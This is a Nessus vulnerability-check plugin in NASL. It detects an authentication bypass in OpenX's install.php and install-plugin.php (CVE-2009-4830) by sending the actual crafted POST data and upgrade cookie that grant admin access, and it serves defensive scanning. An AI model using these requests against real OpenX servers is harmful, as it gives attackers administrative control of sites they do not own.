#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(43864);
  script_version("$Revision: 1.7 $");
  script_cvs_date("$Date: 2016/05/12 14:46:30 $");

  script_cve_id("CVE-2009-4830");
  script_bugtraq_id(37457);
  script_osvdb_id(61300);
  script_xref(name:"Secunia", value:"37914");

  script_name(english:"OpenX install.php / install-plugin.php Admin Authentication Bypass");
  script_summary(english:"Tries to access the admin dashboard");

  script_set_attribute(
    attribute:"synopsis",
    value:
"A PHP application hosted on the remote web server has an
authentication bypass vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The version of OpenX hosted on the remote web server has an
authentication bypass vulnerability.  Sending a specially crafted
request to install.php or install-plugin.php bypasses the normal
authentication process.

A remote attacker could exploit this to gain administrative access to
the OpenX installation."
  );
  script_set_attribute(attribute:"see_also", value:"http://forum.openx.org/index.php?showtopic=503454011");
  script_set_attribute(attribute:"solution", value:"Upgrade to OpenX 2.8.3 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2009/12/22");
  script_set_attribute(attribute:"patch_publication_date", value:"2009/12/24");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/01/12");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_end_attributes();

  script_category(ACT_GATHER_INFO);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2010-2016 Tenable Network Security, Inc.");

  script_dependencies("openx_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/openx");

  exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");


OA_UPGRADE_UPGRADE = 35;


port = get_http_port(default:80);
if (!can_host_php(port:port))
  exit(0, "The web server on port "+port+" doesn't support PHP scripts.");

install = get_install_from_kb(appname:'openx', port:port);
if (isnull(install))
  exit(1, "No OpenX installs on port "+port+" were found in the KB.");

# First, look at install.php
url = install['dir'] + '/www/admin/install.php';

# make sure the page exists before posting
res = http_send_recv3(method:"GET", item:url, port:port);
if (isnull(res)) exit(1, "The web server on port "+port+" failed to respond.");

headers = parse_http_headers(status_line:res[0], headers:res[1]);
if (isnull(headers)) exit(1, 'Error parsing HTTP headers on port '+port+'.');

code = headers['$code'];
if (isnull(code)) exit(1, "Error parsing HTTP status code on port "+port+".");

# If the page exists, a GET will result in a redirect
if (code != 302)
  debug_print("Error retrieving "+ build_url(qs:url, port:port));
else
{
  # if the page exists, attempt to exploit
  postdata = 'btn_openads='+SCRIPT_NAME+'&btn_plugins='+unixtime();
  req = http_mk_post_req(
    port:port,
    item:url,
    content_type:'application/x-www-form-urlencoded',
    data:postdata
  );
  res = http_send_recv_req(port:port, req:req);
  if (isnull(res))
    exit(1, "The web server on port "+port+" failed to respond.");

  # If the app is patched, the request will result in a redirect.  Otherwise,
  # we'll get the plugins page and an authenticated session
  if ('<title>OpenX - Plugins</title>' >< res[2])
  {
    if (report_verbosity > 0)
    {
      report =
        '\nNessus bypassed authentication by issuing the following request :\n\n'+
        crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30)+'\n'+
        req = http_mk_buffer_from_req(req:req)+'\n'+
        crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30)+'\n';
      security_hole(port:port, extra:report);
    }
    else security_hole(port);

    exit(0);
  }
}

# If that attempt didn't work, try to exploit install-plugin.php
plugin_name = SCRIPT_NAME+'-'+unixtime();
qs = '?status=1&plugin='+plugin_name;
url = install['dir']+'/www/admin/install-plugin.php'+qs;
enable_cookiejar();
set_http_cookie(name:'oat', value:OA_UPGRADE_UPGRADE);
req = http_mk_get_req(
  port:port,
  item:url
);
res = http_send_recv_req(port:port, req:req);
if (isnull(res))
  exit(1, "The web server on port "+port+" failed to respond.");

# If the app is patched, the request will result in a redirect.  Otherwise,
# it'll show us an error message and establish a session as admin
if ('Problems found with plugin '+plugin_name >< res[2])
{
  if (report_verbosity > 0)
  {
    report =
      '\nNessus bypassed authentication by issuing the following request :\n\n'+
      crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30)+'\n'+
      req = http_mk_buffer_from_req(req:req)+'\n'+
      crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30)+'\n';
    security_hole(port:port, extra:report);
  }
  else security_hole(port);
}
else
{
  full_url = build_url(qs:install['dir'] + '/', port:port);
  exit(0, 'The OpenX install at '+full_url+' is not affected.');
}

